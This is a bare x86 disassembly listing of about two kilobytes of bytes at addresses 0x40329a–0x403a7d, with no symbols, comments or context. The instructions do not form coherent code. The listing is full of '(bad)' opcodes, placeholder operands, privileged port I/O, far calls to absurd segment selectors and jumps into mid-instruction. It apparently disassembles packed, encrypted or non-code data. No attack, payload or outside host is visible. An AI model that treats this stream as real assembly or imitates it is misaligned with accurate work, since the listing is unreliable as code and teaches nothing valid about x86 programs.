  40329a:	outs   dx,BYTE PTR ds:[esi]
  40329b:	cmp    BYTE PTR [ebp-0x6ad558f5],cl
  4032a1:	xor    al,0xb7
  4032a3:	pop    ds
  4032a4:	and    ah,bh
  4032a6:	pop    ss
  4032a7:	call   0x8c8c:0x8d63bb7f
  4032ae:	xchg   edi,eax
  4032af:	out    dx,eax
  4032b0:	jne    0x4032db
  4032b2:	xchg   esp,eax
  4032b3:	xor    BYTE PTR [ecx+0x65],dh
  4032b6:	jg     0x4032d1
  4032b8:	retf   0x9c19
  4032bb:	ror    ch,0x1f
  4032be:	fcomp  DWORD PTR [ebp-0x2f30a8f8]
  4032c4:	and    edx,DWORD PTR [edx+ebp*8+0x68f4a0e1]
  4032cb:	inc    esp
  4032cc:	js     0x40331c
  4032ce:	push   ecx
  4032cf:	loopne 0x403277
  4032d1:	fwait
  4032d2:	push   ss
  4032d3:	dec    eax
  4032d4:	sbb    edx,DWORD PTR [eax]
  4032d6:	stc    
  4032d7:	pop    ss
  4032d8:	sbb    eax,0x250ebbf5
  4032dd:	push   esi
  4032de:	push   esp
  4032df:	inc    edi
  4032e0:	inc    edi
  4032e1:	fucomip st,st(6)
  4032e3:	and    DWORD PTR [edx+0x5d],eax
  4032e6:	and    DWORD PTR [ebx],edi
  4032e8:	pop    ebp
  4032e9:	add    BYTE PTR [esi+edx*4-0x31449fc4],bh
  4032f0:	fs dec ecx
  4032f2:	fisubr DWORD PTR [edi]
  4032f4:	lahf   
  4032f5:	adc    eax,0x6ab8d731
  4032fa:	add    bh,BYTE PTR [esi-0x62]
  4032fd:	(bad)  
  4032fe:	scas   eax,DWORD PTR es:[edi]
  4032ff:	ret    
  403300:	xor    BYTE PTR [esi],cl
  403302:	rcr    DWORD PTR [ebp-0x17],1
  403305:	mov    ecx,0xeabc2ec5
  40330a:	ret    0x6d7d
  40330d:	xor    DWORD PTR ds:[edx*4+0x37013dd5],ebp
  403315:	out    dx,al
  403316:	jecxz  0x40333c
  403318:	mov    al,0x50
  40331a:	inc    ebp
  40331b:	cld    
  40331c:	mov    ecx,0x1d77da12
  403321:	dec    ecx
  403322:	fisub  WORD PTR [esi-0x6a78b8ff]
  403328:	dec    edi
  403329:	xor    cl,BYTE PTR [eax]
  40332b:	fidiv  WORD PTR [ecx]
  40332d:	jbe    0x403340
  40332f:	push   0xa46ac77
  403334:	fisttp WORD PTR [eax-0x54]
  403337:	adc    al,0xef
  403339:	cmp    dh,BYTE PTR [ebx-0x38]
  40333c:	pop    esp
  40333d:	ja     0x403388
  40333f:	stc    
  403340:	mov    DWORD PTR [edi-0x2fb9aa4f],eax
  403346:	test   DWORD PTR [ebx],esp
  403348:	repnz (bad) 
  40334a:	ret    
  40334b:	sub    dl,dl
  40334d:	mov    bl,0x67
  40334f:	sub    ebp,eax
  403351:	mov    ebp,0x56a41833
  403356:	jne    0x4032db
  403358:	dec    edx
  403359:	xchg   DWORD PTR [eax],esi
  40335b:	pop    edi
  40335c:	call   FWORD PTR ds:0x882cca1f
  403362:	add    bh,BYTE PTR [ebx+0x5d]
  403365:	sub    edi,DWORD PTR [eax+0x7a]
  403368:	mov    edi,0xb4e5c09
  40336d:	cmp    bh,BYTE PTR [ecx-0x50]
  403370:	push   0xd82c001b
  403375:	adc    al,0x72
  403377:	sbb    BYTE PTR [eax-0x37],bl
  40337a:	dec    ebx
  40337b:	shl    ebp,cl
  40337d:	or     eax,0x7157fd8c
  403382:	xchg   BYTE PTR [ecx],bl
  403384:	or     bl,al
  403386:	pop    ss
  403387:	je     0x4033a2
  403389:	ss pop ebp
  40338b:	adc    dl,BYTE PTR [esi+0x17a6a93a]
  403391:	daa    
  403392:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403393:	hlt    
  403394:	outs   dx,BYTE PTR ds:[esi]
  403395:	rcr    bl,0xfe
  403398:	mov    ah,0x64
  40339a:	jle    0x4033ad
  40339c:	push   ecx
  40339d:	mov    al,0x17
  40339f:	xchg   BYTE PTR [edx+0x14],bl
  4033a2:	inc    esi
  4033a3:	cs mov esi,edi
  4033a6:	cmp    bl,bh
  4033a8:	cli    
  4033a9:	jbe    0x40334e
  4033ab:	pusha  
  4033ac:	shr    BYTE PTR [edi-0x63321ebe],cl
  4033b2:	ret    
  4033b3:	mov    cl,0x71
  4033b5:	xchg   ch,dl
  4033b7:	pusha  
  4033b8:	adc    BYTE PTR [edi],al
  4033ba:	mov    eax,ds:0x8024ab35
  4033bf:	int3   
  4033c0:	int    0x77
  4033c2:	loopne 0x4033a1
  4033c4:	adc    BYTE PTR [ecx-0x4e57df8f],dh
  4033ca:	fld    QWORD PTR [eax+eax*4-0xa]
  4033ce:	pop    esp
  4033cf:	push   ebx
  4033d0:	aad    0x2a
  4033d2:	inc    ecx
  4033d3:	xor    ah,dl
  4033d5:	stos   BYTE PTR es:[edi],al
  4033d6:	fistp  QWORD PTR [ecx]
  4033d8:	nop
  4033d9:	or     DWORD PTR [ebp-0xb3db0ff],ebp
  4033df:	pop    edx
  4033e0:	jae    0x4033c7
  4033e2:	mov    ch,0x7d
  4033e4:	push   esp
  4033e5:	ret    
  4033e6:	stos   DWORD PTR es:[edi],eax
  4033e7:	pop    es
  4033e8:	(bad)  
  4033e9:	cmc    
  4033ea:	push   0x5bbf9635
  4033ef:	sahf   
  4033f0:	pop    esp
  4033f1:	popa   
  4033f2:	sub    al,BYTE PTR [ecx+esi*2-0x2a]
  4033f6:	lods   al,BYTE PTR ss:[esi]
  4033f8:	sbb    DWORD PTR [eax-0xb],esp
  4033fb:	hlt    
  4033fc:	ret    
  4033fd:	mov    eax,0x40ac2dae
  403402:	and    eax,0x969d892
  403407:	push   edx
  403408:	mov    DWORD PTR [edx+edi*1],ebp
  40340b:	dec    edx
  40340c:	sbb    edx,ecx
  40340e:	fisubr WORD PTR [edx-0x5595122c]
  403414:	and    al,0x59
  403416:	xchg   DWORD PTR fs:[edi],ebp
  403419:	rcr    DWORD PTR [edi+0xd],1
  40341c:	sub    ebx,ebp
  40341e:	mov    ch,0x94
  403420:	imul   ebx,ebx,0x7a
  403423:	jbe    0x40343d
  403425:	daa    
  403426:	fistp  QWORD PTR cs:[ebx-0x40]
  40342a:	ins    DWORD PTR es:[edi],dx
  40342b:	add    bl,BYTE PTR [ecx-0x7738c806]
  403431:	or     ch,bl
  403433:	mov    dl,0xf1
  403435:	lods   eax,DWORD PTR ds:[esi]
  403436:	mov    ch,0x67
  403438:	xor    DWORD PTR [eax],edx
  40343a:	ss xchg edx,eax
  40343c:	and    eax,0x859c4041
  403441:	loop   0x403428
  403443:	ss xchg esp,eax
  403445:	push   ss
  403446:	lock xchg BYTE PTR ds:0x4d341c6b,dl
  40344d:	pusha  
  40344e:	fisubr WORD PTR [edi]
  403450:	pop    ss
  403451:	addr16 aas 
  403453:	in     al,dx
  403454:	clc    
  403455:	xor    cl,dl
  403457:	shl    BYTE PTR ds:0xccb4bc87,1
  40345d:	sbb    ch,al
  40345f:	mov    ebx,0xc8729a46
  403464:	fisttp QWORD PTR [esi-0x2e5f110b]
  40346a:	inc    ecx
  40346b:	inc    edi
  40346c:	loope  0x403469
  40346e:	enter  0x4175,0xf6
  403472:	aad    0xe5
  403474:	test   BYTE PTR [ebp-0x76],dh
  403477:	ret    0x6a39
  40347a:	and    DWORD PTR [edx+0x36],ecx
  40347d:	add    BYTE PTR [eax],0xf9
  403480:	cwde   
  403481:	sbb    BYTE PTR [edx+0x470e1656],ch
  403487:	mov    bl,0x2d
  403489:	out    dx,al
  40348a:	cmp    eax,0xb842f636
  40348f:	cmp    al,0x87
  403491:	cdq    
  403492:	sub    eax,0xb7430bb7
  403497:	pusha  
  403498:	mov    DWORD PTR [ecx+0x19],ebx
  40349b:	jns    0x40342a
  40349d:	dec    ebp
  40349e:	je     0x403440
  4034a0:	xor    eax,0x30f946d9
  4034a5:	or     eax,0x81fd8335
  4034aa:	std    
  4034ab:	push   esi
  4034ac:	lds    eax,FWORD PTR [edi]
  4034ae:	mov    bh,0x15
  4034b0:	jne    0x4034de
  4034b2:	mov    eax,ds:0x35262556
  4034b7:	xchg   esp,eax
  4034b8:	shr    DWORD PTR [edx+edx*2],1
  4034bb:	inc    ebp
  4034bc:	mov    ebx,0x3743b9dc
  4034c1:	and    eax,0x632ddadd
  4034c6:	stos   BYTE PTR es:[edi],al
  4034c7:	lea    ecx,[eax+0x48e3672c]
  4034cd:	inc    ebp
  4034ce:	dec    esi
  4034cf:	mov    eax,ds:0x6172983c
  4034d4:	loopne 0x40351c
  4034d6:	dec    edx
  4034d7:	pop    ds
  4034d8:	ret    0x2649
  4034db:	mov    ?,WORD PTR [ebx]
  4034dd:	jns    0x40354e
  4034df:	mov    bh,0xad
  4034e1:	fsub   DWORD PTR [esi-0x11d4f937]
  4034e7:	ret    
  4034e8:	mov    edi,0x90fd0b8f
  4034ed:	daa    
  4034ee:	dec    esi
  4034ef:	add    al,0x82
  4034f1:	(bad)
  4034f5:	jb     0x40350e
  4034f7:	retf   0x8005
  4034fa:	and    cl,BYTE PTR [ebx-0x34d2c2e8]
  403500:	and    BYTE PTR [eax],cl
  403502:	pop    edi
  403503:	sbb    ebx,0xa10fac5e
  403509:	inc    edx
  40350a:	inc    edx
  40350b:	cmp    edx,ecx
  40350d:	cs stc 
  40350f:	mov    dl,BYTE PTR [eax+0x1f]
  403512:	inc    esp
  403513:	jno    0x403588
  403515:	xlat   BYTE PTR ds:[ebx]
  403516:	in     al,0x29
  403518:	test   eax,0x3fef1d01
  40351d:	push   esi
  40351e:	mov    ds:0x55f6fbf1,eax
  403523:	shl    BYTE PTR [esi+0x24],0xef
  403527:	loop   0x4034d5
  403529:	jb     0x40354d
  40352b:	dec    esi
  40352c:	(bad)  
  40352d:	outs   dx,DWORD PTR ds:[esi]
  40352e:	cmp    ah,BYTE PTR [esi+edx*4]
  403531:	rol    DWORD PTR [edi],cl
  403533:	sbb    DWORD PTR [edx+0x4e],edx
  403536:	cmp    eax,0xd0199c4
  40353b:	js     0x403529
  40353d:	mov    bl,0x15
  40353f:	loope  0x403563
  403541:	jnp    0x4035b8
  403543:	popa   
  403544:	mov    cs,WORD PTR [ebp-0xb0a74e7]
  40354a:	fcmovne st,st(0)
  40354c:	aam    0x8c
  40354e:	cmp    DWORD PTR [ecx+ebx*8],ebp
  403551:	pop    ebp
  403552:	and    eax,0x4d4229ab
  403557:	in     eax,dx
  403558:	pop    ds
  403559:	ins    DWORD PTR es:[edi],dx
  40355a:	pusha  
  40355b:	out    0x27,eax
  40355d:	jmp    FWORD PTR [ebp+0x1ac5139e]
  403563:	push   ebp
  403564:	test   al,0xd7
  403566:	push   ecx
  403567:	stos   BYTE PTR es:[edi],al
  403568:	aad    0xa1
  40356a:	pop    es
  40356b:	test   eax,0xc5198574
  403570:	pop    esi
  403571:	aaa    
  403572:	ret    0x1d57
  403575:	mov    ecx,DWORD PTR [ecx]
  403577:	(bad)  
  403578:	out    0xbb,al
  40357a:	shl    esp,0x1b
  40357d:	shl    esi,0x50
  403580:	jl     0x403579
  403582:	cmp    al,0xff
  403584:	mov    dl,0x2d
  403586:	and    eax,DWORD PTR [eax-0x38]
  403589:	icebp  
  40358a:	xchg   ebx,eax
  40358b:	jmp    0xc44446f6
  403590:	neg    DWORD PTR [ebx+0x46]
  403593:	fld    TBYTE PTR [ebp+0x37109244]
  403599:	loope  0x4035af
  40359b:	xchg   ecx,eax
  40359c:	sub    ebp,esp
  40359e:	push   es
  40359f:	out    dx,eax
  4035a0:	xor    BYTE PTR [ecx+0x5f],bl
  4035a3:	and    BYTE PTR [ebp+0x6b],dl
  4035a6:	stc    
  4035a7:	pop    esp
  4035a8:	repz not DWORD PTR [esi+0x59]
  4035ac:	test   DWORD PTR [ebp+0x4fffd583],eax
  4035b2:	adc    eax,0xdab7d025
  4035b7:	and    DWORD PTR [edx+0x66cf0072],edx
  4035bd:	sbb    eax,eax
  4035bf:	jp     0x403601
  4035c1:	cmp    dl,BYTE PTR [ebx-0x6297ea71]
  4035c7:	jo     0x4035e0
  4035c9:	adc    eax,0xdf46bbbe
  4035ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035cf:	js     0x4035ff
  4035d1:	jno    0x4035aa
  4035d3:	mov    cl,BYTE PTR [ebx-0x934af83]
  4035d9:	fst    QWORD PTR [ebp-0x48]
  4035dc:	cld    
  4035dd:	lock adc edi,DWORD PTR [ecx-0x5ddae5d]
  4035e4:	jb     0x4035ec
  4035e6:	lods   eax,DWORD PTR ds:[esi]
  4035e7:	lock mov ebx,0xdf6bdd3a
  4035ed:	leave  
  4035ee:	and    cl,BYTE PTR [edi-0x67]
  4035f1:	pop    ebp
  4035f2:	out    0x49,al
  4035f4:	sbb    eax,DWORD PTR [ebp-0x3]
  4035f7:	ret    
  4035f8:	aad    0xe6
  4035fa:	dec    ecx
  4035fb:	call   0xf0cd:0xfc592b38
  403602:	mov    WORD PTR [edi-0x20],?
  403605:	cdq    
  403606:	cmp    al,0x6e
  403608:	pop    esi
  403609:	jmp    0x403663
  40360b:	es or  al,0xe
  40360e:	hlt    
  40360f:	dec    esi
  403610:	xchg   BYTE PTR [ecx-0x54],bh
  403613:	cwde   
  403614:	mov    al,ds:0x9c4cc71a
  403619:	popa   
  40361a:	mov    ch,0xa2
  40361c:	or     eax,0xfc45588d
  403621:	loope  0x4035bd
  403623:	mov    ds:0x4e3d5158,al
  403628:	scas   al,BYTE PTR es:[edi]
  403629:	cdq    
  40362a:	dec    eax
  40362b:	inc    esi
  40362c:	jno    0x403621
  40362e:	fld    DWORD PTR [eax-0xfda876b]
  403634:	daa    
  403635:	xchg   ebp,eax
  403636:	in     al,0x42
  403638:	aam    0x66
  40363a:	jl     0x40366d
  40363c:	push   es
  40363d:	cdq    
  40363e:	add    DWORD PTR [edx-0x6b69515e],0x52
  403645:	adc    dh,BYTE PTR [edi-0x67]
  403648:	pushf  
  403649:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40364a:	pop    edi
  40364b:	sbb    eax,0xe6090613
  403650:	clc    
  403651:	dec    eax
  403652:	add    eax,0xaaebe5d3
  403657:	popa   
  403658:	sbb    dl,BYTE PTR [edx+0x34]
  40365b:	pop    es
  40365c:	aad    0x1f
  40365e:	dec    DWORD PTR [eax+0x1f]
  403661:	adc    al,0xae
  403663:	shl    DWORD PTR [edx-0x3],cl
  403666:	push   esp
  403667:	dec    ebx
  403668:	xchg   DWORD PTR [ebx],esi
  40366a:	mov    bl,0x6d
  40366c:	ja     0x403655
  40366e:	push   edi
  40366f:	cvtps2pd xmm4,xmm5
  403672:	xchg   ecx,eax
  403673:	sbb    edx,DWORD PTR [edx]
  403675:	and    eax,DWORD PTR [esi+eax*2+0x21]
  403679:	and    eax,0x3274744e
  40367e:	cmp    DWORD PTR [ebp-0xb],ecx
  403681:	mov    al,0x8c
  403683:	sub    ecx,DWORD PTR [ebp+0x518f9c94]
  403689:	or     al,0x8a
  40368b:	aad    0x2d
  40368d:	or     ch,BYTE PTR [esi]
  40368f:	or     DWORD PTR [edi-0x3550ab52],ebx
  403695:	sti    
  403696:	xor    BYTE PTR [ebx],0xba
  403699:	adc    al,0xa
  40369b:	popf   
  40369c:	(bad)  
  40369d:	stos   DWORD PTR es:[edi],eax
  40369e:	mov    bl,0x1b
  4036a0:	test   BYTE PTR [edi],ah
  4036a2:	mov    WORD PTR [ebx+edi*4+0xd303128],ds
  4036a9:	add    eax,0x4955073e
  4036ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036af:	mov    dh,0xf1
  4036b1:	add    DWORD PTR [edx+0x14],edx
  4036b4:	add    BYTE PTR [edx],ah
  4036b6:	and    BYTE PTR [ebx+0x1376c122],dh
  4036bc:	xchg   esi,eax
  4036bd:	jecxz  0x4036b2
  4036bf:	dec    esp
  4036c0:	je     0x4036b9
  4036c2:	mov    ch,0xce
  4036c4:	adc    al,BYTE PTR [ebx+0x1162d4fb]
  4036ca:	(bad)  [esi]
  4036cc:	dec    esp
  4036cd:	pushf  
  4036ce:	rcl    bh,0xbc
  4036d1:	dec    ebx
  4036d2:	out    dx,al
  4036d3:	setb   BYTE PTR [esi]
  4036d6:	add    eax,0xdc7ec75
  4036db:	jmp    0x87dd:0xfae1b83a
  4036e2:	aam    0x1b
  4036e4:	(bad)  
  4036e5:	push   0x68278653
  4036ea:	call   0x82f9:0xccfd4d48
  4036f1:	cmc    
  4036f2:	push   eax
  4036f3:	das    
  4036f4:	jo     0x403716
  4036f6:	dec    edx
  4036f7:	push   ecx
  4036f8:	rol    DWORD PTR [ebx+ecx*2],1
  4036fb:	adc    edx,0xfc1fd73c
  403701:	cmp    BYTE PTR [esi],0xcb
  403704:	gs sub edi,ebx
  403707:	push   cs
  403708:	hlt    
  403709:	push   ss
  40370a:	push   0x36
  40370c:	push   esi
  40370d:	add    DWORD PTR [edx],0xfffffff3
  403710:	or     edi,DWORD PTR [edx]
  403712:	jne    0x403737
  403714:	adc    ah,dh
  403716:	bound  eax,QWORD PTR [eax-0x5437cbb2]
  40371c:	arpl   WORD PTR [edi+ebp*4-0x66040995],di
  403723:	repnz clc 
  403725:	mov    al,ds:0x57c8c460
  40372a:	stc    
  40372b:	cmp    eax,0xaa5bbb5
  403730:	mov    edi,0x31c36a71
  403735:	mov    esi,0xee3e88bb
  40373a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40373b:	jg     0x4036e2
  40373d:	mov    WORD PTR [eax],ds
  40373f:	and    DWORD PTR [esp+esi*8-0x5b523087],0xfffffffe
  403747:	aaa    
  403748:	mov    al,fs:0xd07d866
  40374e:	mov    cl,0xb9
  403750:	retf   0x101
  403753:	and    eax,0x4022a638
  403758:	(bad)  
  403759:	jge    0x403767
  40375b:	and    BYTE PTR [edx+0x4b],bl
  40375e:	jmp    0x4037a4
  403760:	sub    al,0x21
  403762:	adc    al,0x8e
  403764:	scas   al,BYTE PTR es:[edi]
  403765:	daa    
  403766:	je     0x4037bb
  403768:	mov    ah,0xa
  40376a:	lea    eax,[edx+0x264fc2ee]
  403770:	sub    ah,BYTE PTR [esp+eax*4]
  403773:	cdq    
  403774:	pop    ds
  403775:	cmp    eax,DWORD PTR [ebp+0x53a43b4c]
  40377b:	cmp    al,0xa5
  40377d:	dec    eax
  40377e:	mov    esp,DWORD PTR [ebx+0x3a]
  403781:	sub    bl,bh
  403783:	test   al,0x3f
  403785:	dec    edi
  403786:	fdivr  QWORD PTR [ebp+0x55]
  403789:	inc    esp
  40378a:	(bad)
  40378e:	in     eax,0x9c
  403790:	imul   eax,DWORD PTR [edi-0x20],0xffffffa8
  403794:	inc    esi
  403795:	div    BYTE PTR [esi]
  403797:	add    al,0x40
  403799:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40379a:	(bad)  
  40379b:	xchg   ecx,eax
  40379c:	xor    al,0x37
  40379e:	(bad)  
  4037a0:	(bad)  
  4037a1:	(bad)  
  4037a2:	(bad)  
  4037a4:	int    0x55
  4037a6:	xchg   esp,eax
  4037a7:	xchg   dh,cl
  4037a9:	xchg   ebx,eax
  4037aa:	add    ch,BYTE PTR [edi]
  4037ac:	pop    edi
  4037ad:	call   0x861:0xd5bcd38f
  4037b4:	call   0xfa05bdf6
  4037b9:	mov    DWORD PTR [ecx+0x41],esi
  4037bc:	mov    esi,0xc5a1616b
  4037c1:	fwait
  4037c2:	xchg   BYTE PTR [edi-0x71],cl
  4037c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037c6:	jnp    0x4037f9
  4037c8:	(bad)  
  4037c9:	lea    ebp,[eax-0x54]
  4037cc:	mov    ecx,0xb81f190d
  4037d1:	ficomp DWORD PTR [edx+0xb448706]
  4037d7:	cmp    eax,esi
  4037d9:	and    dl,BYTE PTR [ecx]
  4037db:	sub    eax,0x55a2fc0a
  4037e0:	arpl   WORD PTR [esi],cx
  4037e2:	fisttp QWORD PTR [ecx]
  4037e4:	test   eax,0x89f87f33
  4037e9:	icebp  
  4037ea:	inc    eax
  4037eb:	retf   0xbbf3
  4037ee:	cvttps2pi mm3,xmm3
  4037f1:	jl     0x4037d4
  4037f3:	and    al,0xa9
  4037f5:	xor    DWORD PTR [edx],edi
  4037f7:	pop    ecx
  4037f8:	pop    esi
  4037f9:	ja     0x403861
  4037fb:	outs   dx,DWORD PTR ds:[esi]
  4037fc:	mov    eax,ds:0xd40bf611
  403801:	dec    ebx
  403802:	mov    al,0x8f
  403804:	mov    ds:0x8fb25058,al
  403809:	and    bl,cl
  40380b:	fimul  DWORD PTR [ebx-0x6f4f1a8f]
  403811:	adc    eax,0xe29cbdc9
  403816:	sub    BYTE PTR [edi+0x5ad1d6c7],ch
  40381c:	cmp    bl,BYTE PTR [esi]
  40381e:	cs and al,0x9e
  403821:	sub    esp,DWORD PTR [ebx-0x8]
  403824:	sub    edi,DWORD PTR ds:0x289c7ce1
  40382a:	mov    al,0x97
  40382c:	ret    0xb396
  40382f:	xor    esp,DWORD PTR [eax]
  403831:	test   BYTE PTR [eax],al
  403833:	push   ebp
  403834:	xor    esi,DWORD PTR [ecx]
  403836:	imul   ecx,esp,0x19aa2bae
  40383c:	ja     0x40383c
  40383e:	sbb    eax,0xcdefa126
  403843:	in     eax,0x13
  403845:	or     eax,0x63dab03b
  40384a:	jge    0x4037d7
  40384c:	mov    ecx,DWORD PTR [ecx-0x1e]
  40384f:	sahf   
  403850:	(bad)  
  403851:	cmc    
  403852:	rol    BYTE PTR [esi+0x7b],cl
  403855:	test   DWORD PTR [esi+0xd4d8cf2],ecx
  40385b:	mov    ebx,0x4b126db7
  403860:	retf   0x6e63
  403863:	jne    0x4037ff
  403865:	mov    bh,0x8b
  403867:	shl    BYTE PTR [ecx-0x4a],1
  40386a:	fucomip st,st(5)
  40386c:	sbb    eax,0x804d55d9
  403871:	sbb    eax,0x11510194
  403876:	fld    QWORD PTR [ebx+0x5d811d17]
  40387c:	jge    0x403868
  40387e:	adc    ebp,DWORD PTR [eax-0x68889ef3]
  403884:	ret    
  403885:	cmp    DWORD PTR [ebp+edi*4+0xd],0xc79a4b
  40388d:	out    dx,eax
  40388e:	(bad)  
  40388f:	jmp    0xeb4baa21
  403894:	jmp    FWORD PTR [esp+edi*8-0xc96d398]
  40389b:	jb     0x403849
  40389d:	(bad)  
  40389e:	js     0x403850
  4038a0:	les    edx,FWORD PTR [edx]
  4038a2:	fisub  DWORD PTR [edi+0x60]
  4038a5:	cmp    BYTE PTR [eax+0x3e],dh
  4038a8:	inc    esp
  4038a9:	pop    esi
  4038aa:	or     DWORD PTR [ebp-0x3bf11692],edx
  4038b0:	adc    al,0xc0
  4038b2:	(bad)  
  4038b3:	dec    esi
  4038b4:	lods   eax,DWORD PTR ds:[esi]
  4038b5:	jmp    0x403863
  4038b7:	mov    ?,WORD PTR [edi-0x19]
  4038ba:	icebp  
  4038bb:	cdq    
  4038bc:	loop   0x4038bd
  4038be:	sbb    eax,0x5c75e9e3
  4038c3:	sbb    al,0x53
  4038c5:	mov    al,ds:0xf37a9564
  4038ca:	into   
  4038cb:	mul    DWORD PTR [ecx+0x5b]
  4038ce:	xchg   ebp,eax
  4038cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4038d0:	cmp    al,0x0
  4038d2:	addr16 call 0x6449ff5c
  4038d8:	cli    
  4038d9:	inc    ebp
  4038da:	jecxz  0x4038ad
  4038dc:	xor    esi,DWORD PTR [ebx+0x49]
  4038df:	cwde   
  4038e0:	je     0x403888
  4038e2:	xchg   ebx,eax
  4038e3:	push   0xa4a8e8f8
  4038e8:	test   BYTE PTR ds:0x13f2ff75,0x71
  4038ef:	sar    bh,0xe9
  4038f2:	cwde   
  4038f3:	and    bh,bh
  4038f5:	stc    
  4038f6:	add    dl,BYTE PTR [ecx]
  4038f8:	inc    ebp
  4038f9:	ja     0x40395d
  4038fb:	cmp    esp,DWORD PTR [edx-0x6e932fd3]
  403901:	aas    
  403902:	outs   dx,DWORD PTR ds:[esi]
  403903:	mov    bh,0x20
  403905:	dec    edx
  403906:	xor    DWORD PTR [ecx],edi
  403908:	test   al,0xb2
  40390a:	(bad)  
  40390b:	cmp    ah,dh
  40390d:	test   BYTE PTR ds:0xa7f0931c,ah
  403913:	mov    eax,0x53e7d121
  403918:	bound  esi,QWORD PTR [edi]
  40391a:	scas   eax,DWORD PTR es:[edi]
  40391b:	jp     0x403912
  40391d:	lock retf 0xc2e3
  403921:	inc    ebx
  403922:	fdiv   st,st(2)
  403924:	shl    dh,0xb7
  403927:	dec    eax
  403928:	push   ds
  403929:	adc    ch,BYTE PTR [ecx+edi*8]
  40392c:	dec    ebp
  40392d:	ret    
  40392e:	lods   eax,DWORD PTR ds:[esi]
  40392f:	jo     0x4038cf
  403931:	cs or  al,0x6e
  403934:	jge    0x4038c9
  403936:	push   es
  403937:	ss addr16 mov edi,0xa0960f09
  40393e:	outs   dx,BYTE PTR ds:[esi]
  40393f:	adc    al,0xc4
  403941:	outs   dx,DWORD PTR ds:[esi]
  403942:	ins    BYTE PTR es:[edi],dx
  403943:	test   eax,0x61cfa25e
  403948:	or     esi,DWORD PTR [edi]
  40394a:	cmp    esp,DWORD PTR [edx-0x3429eee1]
  403950:	pop    ss
  403951:	cmp    BYTE PTR [ebp+0x4627d670],0x4b
  403958:	xchg   dh,bh
  40395a:	scas   al,BYTE PTR es:[edi]
  40395b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40395c:	lds    edx,FWORD PTR [edx+ebp*4+0x5f430d39]
  403963:	out    0x5c,al
  403965:	or     dl,BYTE PTR [esp+esi*1-0xf]
  403969:	sbb    ah,ah
  40396b:	xor    edi,edi
  40396d:	or     eax,0x88735716
  403972:	push   esp
  403973:	sub    al,0x11
  403975:	ins    BYTE PTR es:[edi],dx
  403976:	push   ds
  403977:	das    
  403978:	jg     0x40396d
  40397a:	mov    eax,0x4a3d611
  40397f:	call   0x3325:0xa9220cd
  403986:	add    al,0xbc
  403988:	int3   
  403989:	mov    ds:0xee8a742e,al
  40398e:	nop
  40398f:	sahf   
  403990:	popf   
  403991:	xchg   esp,eax
  403992:	ins    DWORD PTR es:[edi],dx
  403993:	add    DWORD PTR es:[eax],ebp
  403996:	pop    edi
  403997:	mov    dh,BYTE PTR [edx]
  403999:	add    ah,BYTE PTR [esp+eiz*4+0x35]
  40399d:	mov    ah,0x4d
  40399f:	xor    ch,BYTE PTR [ecx]
  4039a1:	jge    0x4039f9
  4039a3:	mov    dh,0x26
  4039a5:	ret    0x2d95
  4039a8:	jns    0x40399d
  4039aa:	push   ebp
  4039ab:	arpl   WORD PTR [ecx+0x2e],di
  4039ae:	jmp    0x4039ad
  4039b0:	outs   dx,BYTE PTR ds:[esi]
  4039b1:	and    esi,esp
  4039b3:	and    bh,0x89
  4039b6:	jle    0x40397a
  4039b8:	mov    tr6,ebx
  4039bb:	mov    cl,0x21
  4039bd:	mov    edi,0xf54d10da
  4039c2:	and    eax,0xcd855ffa
  4039c7:	rcl    DWORD PTR [esi+edi*8+0x3493c895],cl
  4039ce:	push   ds
  4039cf:	icebp  
  4039d0:	mov    ebp,0xe5f4446c
  4039d5:	adc    BYTE PTR [ebp+0x3d2438cb],ch
  4039db:	add    BYTE PTR cs:[edi-0x2c590307],ah
  4039e2:	jge    0x403981
  4039e4:	test   al,0xb6
  4039e6:	aam    0x4b
  4039e8:	hlt    
  4039e9:	or     DWORD PTR [ebp+edi*4-0x69],ecx
  4039ed:	stos   BYTE PTR es:[edi],al
  4039ee:	cmp    eax,0x18551a15
  4039f3:	test   eax,0xa2a6ca2e
  4039f8:	dec    esi
  4039f9:	icebp  
  4039fa:	ret    0x96a7
  4039fd:	push   0x774ef771
  403a02:	xor    BYTE PTR [ebx+0x11c3b53a],bh
  403a08:	adc    DWORD PTR [esi+0x4d],edx
  403a0b:	dec    ebx
  403a0c:	cs and edx,DWORD PTR es:[esi+0x7]
  403a11:	dec    esp
  403a12:	cmp    DWORD PTR [ecx-0xd],0x1f3722b1
  403a19:	repz daa 
  403a1b:	test   al,0x2c
  403a1d:	js     0x403a83
  403a1f:	jnp    0x403a97
  403a21:	mov    al,0xb9
  403a23:	push   es
  403a24:	pop    esi
  403a25:	pop    ebx
  403a26:	out    0x76,al
  403a28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a29:	cwde   
  403a2a:	push   es
  403a2b:	sbb    ah,BYTE PTR [esp+esi*4]
  403a2e:	add    cl,BYTE PTR [eax+eax*2]
  403a31:	sub    DWORD PTR [ecx-0x57],0x50cdbd34
  403a38:	sub    eax,0x2e6cbd42
  403a3d:	data16 mov al,0x1c
  403a40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a41:	lahf   
  403a42:	test   al,dl
  403a44:	xchg   BYTE PTR [eax-0x4f2db841],ah
  403a4a:	iret   
  403a4b:	or     edx,DWORD PTR [edi]
  403a4d:	shr    BYTE PTR [esi],0xd8
  403a50:	xor    BYTE PTR [edi+0x18c504e6],ah
  403a56:	stos   BYTE PTR es:[edi],al
  403a57:	pop    ecx
  403a58:	sub    dh,BYTE PTR [ebx-0x35]
  403a5b:	jo     0x403a41
  403a5d:	pop    ebp
  403a5e:	xor    BYTE PTR [eax+0x12876b58],ah
  403a64:	je     0x4039eb
  403a66:	ficom  DWORD PTR [ecx-0x47]
  403a69:	icebp  
  403a6a:	inc    edi
  403a6b:	pop    edx
  403a6c:	add    edi,DWORD PTR [ecx+ebx*4+0x2562a835]
  403a73:	sub    cl,ah
  403a75:	mov    al,ds:0x44ab2186
  403a7a:	dec    ebx
  403a7b:	jp     0x403a2d
  403a7d:	fcomip st,st(2)
